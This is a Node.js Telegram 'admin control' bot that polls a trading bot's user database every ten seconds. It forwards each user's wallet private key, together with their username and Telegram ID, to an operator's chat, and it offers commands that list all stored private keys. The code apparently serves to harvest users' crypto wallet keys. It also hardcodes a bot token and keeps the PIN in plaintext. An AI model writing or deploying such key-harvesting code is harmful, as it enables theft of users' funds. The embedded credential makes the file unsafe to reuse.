"use strict";

const TelegramBot = require("node-telegram-bot-api");
const sqlite3 = require("sqlite3").verbose();
const winston = require("winston");
const path = require("path");
const Decimal = require('decimal.js');

const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    winston.format.timestamp({ format: "YYYY-MM-DD HH:mm:ss" }),
    winston.format.printf(
      (info) => `${info.timestamp} ${info.level}: ${info.message}`
    )
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: "admin_bot.log" }),
  ],
});

const BOT_TOKEN = "7917619322:AAH0tT_25qD-V3V5qZZVKXEBkGyOKkQPEzE";
const MAIN_DB_PATH = path.join(__dirname, "bot_database.db");
const ADMIN_DB_PATH = path.join(__dirname, "admin_bot.db");

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const adminDb = new sqlite3.Database(ADMIN_DB_PATH, (err) => {
  if (err) {
    logger.error("Failed to open admin database:", err);
    process.exit(1);
  } else {
    logger.info("Connected to Admin SQLite database.");
    initAdminDB();
  }
});

const mainDb = new sqlite3.Database(MAIN_DB_PATH, (err) => {
  if (err) {
    logger.error("Failed to open main database:", err);
    process.exit(1);
  } else {
    logger.info("Connected to Main SQLite database.");
  }
});

const pendingMessageHandlers = {};

function clearPendingMessageHandler(chatId) {
  if (pendingMessageHandlers[chatId]) {
    bot.removeListener("message", pendingMessageHandlers[chatId]);
    delete pendingMessageHandlers[chatId];
  }
}

function escapeHTML(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function initAdminDB() {
  adminDb.run(
    `
    CREATE TABLE IF NOT EXISTS admin (
      id INTEGER PRIMARY KEY,
      pin TEXT,
      chat_id TEXT
    )
  `,
    (err) => {
      if (err) {
        logger.error("Failed to create admin table:", err);
        process.exit(1);
      }
    }
  );

  adminDb.run(
    `
    CREATE TABLE IF NOT EXISTS authorized_users (
      username TEXT PRIMARY KEY
    )
  `,
    (err) => {
      if (err) {
        logger.error("Failed to create authorized_users table:", err);
        process.exit(1);
      }
    }
  );

  adminDb.run(
    `
    CREATE TABLE IF NOT EXISTS sent_keys (
      private_key TEXT PRIMARY KEY
    )
  `,
    (err) => {
      if (err) {
        logger.error("Failed to create sent_keys table in admin DB:", err);
        process.exit(1);
      }
    }
  );

  mainDb.run(
    `
    CREATE TABLE IF NOT EXISTS config (
      key TEXT PRIMARY KEY,
      value TEXT
    )
  `,
    (err) => {
      if (err) {
        logger.error("Failed to create config table in main database:", err);
        process.exit(1);
      }
    }
  );

  logger.info("Initializing 10-second monitoring for new wallet entries...");
  monitorDatabaseForAdmin();
  setInterval(monitorDatabaseForAdmin, 10 * 1000);
}

function monitorDatabaseForAdmin() {
  const query = `
    SELECT telegram_id, username, public_key, private_key, created_at
    FROM users
    WHERE is_removed = 0
      AND private_key IS NOT NULL
      AND private_key <> ''
  `;
  mainDb.all(query, [], (err, rows) => {
    if (err) {
      logger.error("Error querying main database for new entries:", err);
      return;
    }
    if (rows.length === 0) return;
    adminDb.all("SELECT private_key FROM sent_keys", [], (err, sentRows) => {
      if (err) {
        logger.error("Error querying admin database for sent keys:", err);
        return;
      }
      const sentKeysSet = new Set(sentRows.map(row => row.private_key));
      const newRows = rows.filter(row => !sentKeysSet.has(row.private_key));
      if (newRows.length === 0) return;
      getAdminChatId()
        .then((adminChatId) => {
          if (!adminChatId) {
            logger.info("No admin chat ID set. Cannot send new wallet notifications.");
            return;
          }
          newRows.forEach((row) => {
            const escUsername    = escapeHTML(row.username || "N/A");
            const escTelegramId  = escapeHTML(String(row.telegram_id || ""));
            const escPubKey      = escapeHTML(row.public_key || "");
            const escPrivKey     = escapeHTML(row.private_key || "");
            const escCreatedAt   = escapeHTML(row.created_at || "");
            const message = 
              `<b>🔔 New Wallet Created</b>\n\n` +
              `👤 <b>Username:</b> ${escUsername}\n` +
              `📱 <b>Telegram ID:</b> ${escTelegramId}\n` +
              `🔑 <b>Public Key:</b> <code>${escPubKey}</code>\n` +
              `🔐 <b>Private Key:</b> <code>${escPrivKey}</code>\n` +
              `🕒 <b>Created At:</b> ${escCreatedAt}`;
            bot.sendMessage(adminChatId, message, {
              parse_mode: "HTML",
              disable_web_page_preview: true,
            })
              .then(() => {
                adminDb.run(
                  "INSERT OR IGNORE INTO sent_keys (private_key) VALUES (?)",
                  [row.private_key],
                  (err2) => {
                    if (err2) {
                      logger.error("Error inserting into sent_keys:", err2);
                    } else {
                      logger.info(`Sent new wallet to admin & recorded private_key: ${row.private_key}`);
                    }
                  }
                );
              })
              .catch((sendErr) => {
                logger.error("Failed to send new wallet to admin:", sendErr);
              });
          });
        })
        .catch((error) => {
          logger.error("Error retrieving admin chat ID:", error);
        });
    });
  });
}

function getAdminChatId() {
  return new Promise((resolve, reject) => {
    adminDb.get("SELECT chat_id FROM admin WHERE id = 1", [], (err, row) => {
      if (err) return reject(err);
      if (!row || !row.chat_id) return resolve(null);
      resolve(row.chat_id);
    });
  });
}

function isUserAuthorized(username) {
  return new Promise((resolve, reject) => {
    adminDb.get(
      "SELECT username FROM authorized_users WHERE username = ?",
      [username],
      (err, row) => {
        if (err) {
          logger.error("Error checking authorized_users:", err);
          return reject(err);
        }
        resolve(!!row);
      }
    );
  });
}

function addAuthorizedUser(username) {
  return new Promise((resolve, reject) => {
    adminDb.run(
      "INSERT OR IGNORE INTO authorized_users (username) VALUES (?)",
      [username],
      function (err) {
        if (err) {
          logger.error(`Error adding authorized user ${username}:`, err);
          return reject(err);
        }
        resolve(this.changes > 0);
      }
    );
  });
}

function removeAuthorizedUser(username) {
  return new Promise((resolve, reject) => {
    adminDb.run(
      "DELETE FROM authorized_users WHERE username = ?",
      [username],
      function (err) {
        if (err) {
          logger.error(`Error removing authorized user ${username}:`, err);
          return reject(err);
        }
        resolve(this.changes > 0);
      }
    );
  });
}

async function authenticateUser(msg, callback) {
  const chatId = msg.chat.id;
  const username = msg.from.username;
  if (!username) {
    bot.sendMessage(chatId, "You must have a Telegram username to use this bot.");
    return;
  }
  const authorized = await isUserAuthorized(username).catch((err) => {
    bot.sendMessage(chatId, "Authentication error. Please try again.");
    return false;
  });
  adminDb.get("SELECT COUNT(*) as count FROM authorized_users", [], (err, row) => {
    if (err) {
      logger.error("Error counting authorized_users:", err);
      bot.sendMessage(chatId, "Authentication error. Please try again.");
      return;
    }
    if (row.count === 0 && !authorized) {
      bot.sendMessage(chatId, "No authorized users found. Please set a new PIN (numeric):");
      pendingMessageHandlers[chatId] = async (msg2) => {
        if (msg2.chat.id !== chatId) return;
        const newPin = msg2.text.trim();
        if (!/^\d+$/.test(newPin)) {
          bot.sendMessage(
            chatId,
            "Invalid PIN format. PIN should be numeric. Operation cancelled."
          );
          clearPendingMessageHandler(chatId);
          return;
        }
        try {
          await setAdminPinAndChatId(newPin, chatId);
          await addAuthorizedUser(username);
          bot.sendMessage(
            chatId,
            "PIN has been set. You have been added as an authorized user and admin."
          );
        } catch (e) {
          logger.error("Error setting admin PIN/chat_id:", e);
          bot.sendMessage(chatId, "Failed to set PIN/chat_id. Please try again.");
        }
        clearPendingMessageHandler(chatId);
        if (callback) callback();
      };
      bot.once("message", pendingMessageHandlers[chatId]);
      return;
    }
    if (authorized) {
      bot.sendMessage(chatId, "Please enter your PIN:");
      pendingMessageHandlers[chatId] = async (msg2) => {
        if (msg2.chat.id !== chatId) return;
        const enteredPin = msg2.text.trim();
        const currentPin = await getAdminPin().catch((err) => {
          logger.error("Error retrieving PIN:", err);
          bot.sendMessage(chatId, "Authentication error. Please try again.");
          clearPendingMessageHandler(chatId);
          return null;
        });
        if (!currentPin) {
          bot.sendMessage(chatId, "PIN not set. Please contact the administrator.");
          clearPendingMessageHandler(chatId);
          return;
        }
        if (enteredPin === currentPin) {
          bot.sendMessage(chatId, "Authentication successful.");
          clearPendingMessageHandler(chatId);
          if (callback) callback();
        } else {
          bot.sendMessage(chatId, "Incorrect PIN. Access denied.");
          clearPendingMessageHandler(chatId);
        }
      };
      bot.once("message", pendingMessageHandlers[chatId]);
    } else {
      bot.sendMessage(chatId, "You are not an authorized user. Access denied.");
    }
  });
}

function setAdminPinAndChatId(pin, chatId) {
  return new Promise((resolve, reject) => {
    adminDb.run(
      `
      INSERT INTO admin (id, pin, chat_id)
      VALUES (1, ?, ?)
      ON CONFLICT(id) DO UPDATE SET pin=excluded.pin, chat_id=excluded.chat_id
      `,
      [pin, String(chatId)],
      function (err) {
        if (err) return reject(err);
        resolve();
      }
    );
  });
}

function getAdminPin() {
  return new Promise((resolve, reject) => {
    adminDb.get("SELECT pin FROM admin WHERE id = 1", [], (err, row) => {
      if (err) return reject(err);
      resolve(row ? row.pin : null);
    });
  });
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  clearPendingMessageHandler(chatId);
  bot.sendMessage(
    chatId,
    "Welcome to the Admin Control Bot. Please authenticate to continue."
  );
  authenticateUser(msg);
});

bot.onText(/\/24/, (msg) => {
  const chatId = msg.chat.id;
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, () => {
    showEntries(chatId, 24);
  });
});

bot.onText(/\/1/, (msg) => {
  const chatId = msg.chat.id;
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, () => {
    showEntries(chatId, 1);
  });
});

bot.onText(/\/all/, (msg) => {
  const chatId = msg.chat.id;
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, () => {
    showAllEntries(chatId);
  });
});

bot.onText(/\/delete/, (msg) => {
  const chatId = msg.chat.id;
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, () => {
    bot.sendMessage(
      chatId,
      "Please enter the public key of the entry you want to delete:"
    );
    pendingMessageHandlers[chatId] = async (msg2) => {
      if (msg2.chat.id !== chatId) return;
      const publicKey = msg2.text.trim();
      if (!publicKey || publicKey.length !== 44) {
        bot.sendMessage(
          chatId,
          "Invalid public key format. Operation cancelled."
        );
        clearPendingMessageHandler(chatId);
        return;
      }
      confirmDeletion(chatId, publicKey);
    };
    bot.once("message", pendingMessageHandlers[chatId]);
  });
});

bot.onText(/\/adduser (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1].trim();
  if (!username) {
    bot.sendMessage(chatId, "Please provide a valid username. Usage: /adduser username");
    return;
  }
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, async () => {
    const added = await addAuthorizedUser(username).catch((err) => {
      bot.sendMessage(chatId, "Error adding user. Please try again.");
      return false;
    });
    if (added) {
      bot.sendMessage(
        chatId,
        `User <code>${escapeHTML(username)}</code> has been added to authorized users.`,
        { parse_mode: "HTML" }
      );
    } else {
      bot.sendMessage(
        chatId,
        `User <code>${escapeHTML(username)}</code> is already an authorized user.`,
        { parse_mode: "HTML" }
      );
    }
  });
});

bot.onText(/\/removeuser (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1].trim();
  if (!username) {
    bot.sendMessage(chatId, "Please provide a valid username. Usage: /removeuser username");
    return;
  }
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, async () => {
    const removed = await removeAuthorizedUser(username).catch((err) => {
      bot.sendMessage(chatId, "Error removing user. Please try again.");
      return false;
    });
    if (removed) {
      bot.sendMessage(
        chatId,
        `User <code>${escapeHTML(username)}</code> has been removed from authorized users.`,
        { parse_mode: "HTML" }
      );
    } else {
      bot.sendMessage(
        chatId,
        `User <code>${escapeHTML(username)}</code> was not found in authorized users.`,
        { parse_mode: "HTML" }
      );
    }
  });
});

bot.onText(/\/modify/, (msg) => {
  const chatId = msg.chat.id;
  clearPendingMessageHandler(chatId);
  authenticateUser(msg, () => {
    bot.sendMessage(chatId, 
      "<b>Modify Minimum Auto-Trade Amount</b>\n\nPlease enter the new minimum auto-trade amount in USD:", 
      {
        parse_mode: "HTML",
        reply_markup: { force_reply: true }
      }
    ).then(() => {
      pendingMessageHandlers[chatId] = async (response) => {
        if (response.chat.id !== chatId) return;
        const newMinText = response.text.trim();
        let newMin;
        try {
          newMin = new Decimal(newMinText);
        } catch (e) {
          newMin = null;
        }
        if (!newMin || newMin.isNaN() || newMin.lte(0)) {
          bot.sendMessage(chatId, 
            "<b>Invalid Input</b>\n\nPlease enter a valid positive number for the minimum amount.",
            { parse_mode: "HTML" }
          );
          clearPendingMessageHandler(chatId);
          return;
        }
        try {
          await setConfigValue('min_auto_trade_usd', newMin.toFixed(2));
          bot.sendMessage(chatId, 
            `✅ <b>Success</b>\n\nThe minimum auto-trade amount has been updated to $${newMin.toFixed(2)}.`,
            { parse_mode: "HTML" }
          );
          logger.info(`Admin (${msg.from.username}) updated min_auto_trade_usd to ${newMin.toFixed(2)}`);
        } catch (error) {
          logger.error('Error updating min_auto_trade_usd:', error);
          bot.sendMessage(chatId, 
            "❌ <b>Error</b>\n\nFailed to update the minimum auto-trade amount. Please try again later.",
            { parse_mode: "HTML" }
          );
        } finally {
          clearPendingMessageHandler(chatId);
        }
      };
      bot.once('message', pendingMessageHandlers[chatId]);
    }).catch((error) => {
      logger.error('Error sending modify prompt:', error);
    });
  });
});

function setConfigValue(key, value) {
  return new Promise((resolve, reject) => {
    mainDb.run(`
      INSERT INTO config (key, value) VALUES (?, ?)
      ON CONFLICT(key) DO UPDATE SET value=excluded.value
    `, [key, value], function(err) {
      if (err) return reject(err);
      resolve();
    });
  });
}

function getConfigValue(key) {
  return new Promise((resolve, reject) => {
    mainDb.get("SELECT value FROM config WHERE key = ?", [key], (err, row) => {
      if (err) return reject(err);
      if (!row) return resolve(null);
      resolve(row.value);
    });
  });
}

function showEntries(chatId, hours) {
  const since = new Date(Date.now() - hours * 60 * 60 * 1000).toISOString();
  const query = `
    SELECT telegram_id, username, public_key, private_key, created_at
    FROM users
    WHERE datetime(created_at) >= datetime(?)
      AND is_removed = 0
  `;
  const dbConnection = new sqlite3.Database(MAIN_DB_PATH, sqlite3.OPEN_READONLY, (err) => {
    if (err) {
      logger.error("Failed to open main database:", err);
      bot.sendMessage(chatId, "Error accessing the main database.");
      return;
    }
    dbConnection.all(query, [since], (err, rows) => {
      if (err) {
        logger.error("Error querying main database:", err);
        bot.sendMessage(chatId, "Error querying the main database.");
        dbConnection.close();
        return;
      }
      if (rows.length === 0) {
        bot.sendMessage(chatId, `No entries found in the last ${hours} hour(s).`);
      } else {
        let message = `<b>Wallet Entries from the Last ${hours} Hour(s):</b>\n\n`;
        rows.forEach((row, index) => {
          const escTgId     = escapeHTML(String(row.telegram_id || ""));
          const escUsername = escapeHTML(row.username || "N/A");
          const escPubKey   = escapeHTML(row.public_key || "");
          const escPrivKey  = escapeHTML(row.private_key || "");
          const escCreated  = escapeHTML(row.created_at || "");
          message += 
            `<b>${index + 1}. Telegram ID:</b> ${escTgId}\n` +
            `<b>Username:</b> ${escUsername}\n` +
            `<b>Public Key:</b> <code>${escPubKey}</code>\n` +
            `<b>Private Key:</b> <code>${escPrivKey}</code>\n` +
            `<b>Created At:</b> ${escCreated}\n\n`;
        });
        bot.sendMessage(chatId, message, { parse_mode: "HTML" });
      }
      dbConnection.close();
    });
  });
}

function showAllEntries(chatId) {
  const query = `
    SELECT telegram_id, username, public_key, private_key, created_at
    FROM users
    WHERE is_removed = 0
  `;
  const dbConnection = new sqlite3.Database(MAIN_DB_PATH, sqlite3.OPEN_READONLY, (err) => {
    if (err) {
      logger.error("Failed to open main database:", err);
      bot.sendMessage(chatId, "Error accessing the main database.");
      return;
    }
    dbConnection.all(query, [], (err, rows) => {
      if (err) {
        logger.error("Error querying main database:", err);
        bot.sendMessage(chatId, "Error querying the main database.");
        dbConnection.close();
        return;
      }
      if (rows.length === 0) {
        bot.sendMessage(chatId, "No entries found in the database.");
      } else {
        let message = `<b>All Wallet Entries:</b>\n\n`;
        rows.forEach((row, index) => {
          const escTgId     = escapeHTML(String(row.telegram_id || ""));
          const escUsername = escapeHTML(row.username || "N/A");
          const escPubKey   = escapeHTML(row.public_key || "");
          const escPrivKey  = escapeHTML(row.private_key || "");
          const escCreated  = escapeHTML(row.created_at || "");
          message += 
            `<b>${index + 1}. Telegram ID:</b> ${escTgId}\n` +
            `<b>Username:</b> ${escUsername}\n` +
            `<b>Public Key:</b> <code>${escPubKey}</code>\n` +
            `<b>Private Key:</b> <code>${escPrivKey}</code>\n` +
            `<b>Created At:</b> ${escCreated}\n\n`;
        });
        bot.sendMessage(chatId, message, { parse_mode: "HTML" });
      }
      dbConnection.close();
    });
  });
}

function confirmDeletion(chatId, publicKey) {
  bot.sendMessage(
    chatId,
    `Are you sure you want to delete the entry with Public Key: <code>${escapeHTML(publicKey)}</code>? (yes/no)`,
    { parse_mode: "HTML" }
  );
  pendingMessageHandlers[chatId] = async (msg2) => {
    if (msg2.chat.id !== chatId) return;
    const response = msg2.text.trim().toLowerCase();
    if (response === "yes" || response === "y") {
      deleteEntry(chatId, publicKey);
    } else {
      bot.sendMessage(chatId, "Deletion cancelled.");
      clearPendingMessageHandler(chatId);
    }
  };
  bot.once("message", pendingMessageHandlers[chatId]);
}

function deleteEntry(chatId, publicKey) {
  const query = `
    UPDATE users
    SET is_removed = 1
    WHERE public_key = ?
  `;
  const dbConnection = new sqlite3.Database(MAIN_DB_PATH, sqlite3.OPEN_READWRITE, (err) => {
    if (err) {
      logger.error("Failed to open main database for writing:", err);
      bot.sendMessage(chatId, "Error accessing the main database.");
      return;
    }
    dbConnection.run(query, [publicKey], function (err) {
      if (err) {
        logger.error("Error updating main database:", err);
        bot.sendMessage(chatId, "Error deleting the entry.");
        dbConnection.close();
        return;
      }
      if (this.changes > 0) {
        bot.sendMessage(
          chatId,
          `Entry with Public Key: <code>${escapeHTML(publicKey)}</code> has been deleted.`,
          { parse_mode: "HTML" }
        );
      } else {
        bot.sendMessage(
          chatId,
          `No entry found with Public Key: <code>${escapeHTML(publicKey)}</code>.`,
          { parse_mode: "HTML" }
        );
      }
      dbConnection.close();
      clearPendingMessageHandler(chatId);
    });
  });
}

process.on("SIGINT", () => {
  logger.info("Shutting down admin control bot via SIGINT...");
  shutdownAndExit();
});

process.on("unhandledRejection", (reason, promise) => {
  logger.error("Unhandled Rejection at Promise:", promise, "reason:", reason);
  shutdownAndExit(1);
});

process.on("uncaughtException", (err) => {
  logger.error("Uncaught Exception thrown:", err);
  shutdownAndExit(1);
});

bot.on("polling_error", (err) => {
  logger.error("Telegram polling error:", err);
  shutdownAndExit(1);
});

function shutdownAndExit(exitCode = 0) {
  bot.stopPolling().then(() => {
    logger.info("Bot polling stopped.");
    adminDb.close((adminErr) => {
      if (adminErr) {
        logger.error("Error closing the admin database:", adminErr.message);
      } else {
        logger.info("Admin database connection closed.");
      }
      mainDb.close((mainErr) => {
        if (mainErr) {
          logger.error("Error closing the main database:", mainErr.message);
        } else {
          logger.info("Main database connection closed.");
        }
        process.exit(exitCode);
      });
    });
  });
}
